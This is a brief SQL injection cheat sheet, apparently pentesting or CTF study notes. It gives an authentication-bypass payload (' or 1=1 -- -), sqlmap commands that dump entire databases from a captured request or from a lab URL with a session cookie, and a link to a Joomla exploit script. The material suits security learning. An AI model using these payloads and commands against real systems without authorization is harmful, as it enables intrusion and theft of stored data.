# SQL Commands
Commands and techniques for SQL injection and database enumeration

## Useful Links
- [Joomla Exploit Script](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py)

## Basic SQL query
```sql copy
SELECT * FROM users WHERE username = :username AND password = :password
```
- Retrieves user data from the database with provided credentials.

## SQL injection (bypass authentication)
```sql copy
SELECT * FROM users WHERE username = admin AND password = ' or 1=1 -- -
```
- Bypasses authentication by injecting a true condition.
- `' or 1=1 -- -`: Makes the query always true and comments out the rest.

## SQLmap with request file
```bash copy
sqlmap -r request.txt --dbms=mysql --dump
```
- Automates SQL injection using a captured HTTP request.
- `-r request.txt`: Uses saved HTTP request file.
- `--dbms=mysql`: Specifies MySQL database.
- `--dump`: Dumps database contents.

## SQLmap with URL and cookie
```bash copy
sqlmap http://10.10.10.10/admin?user=3 --cookie='token=[Enter Cookie]' --technique=U --delay=2 --dump
```
- Performs SQL injection on a specific URL with a cookie.
- `--cookie='token=[Enter Cookie]'`: Specifies authentication cookie.
- `--technique=U`: Uses UNION-based injection.
- `--delay=2`: Adds 2-second delay between requests.
- `--dump`: Dumps database contents.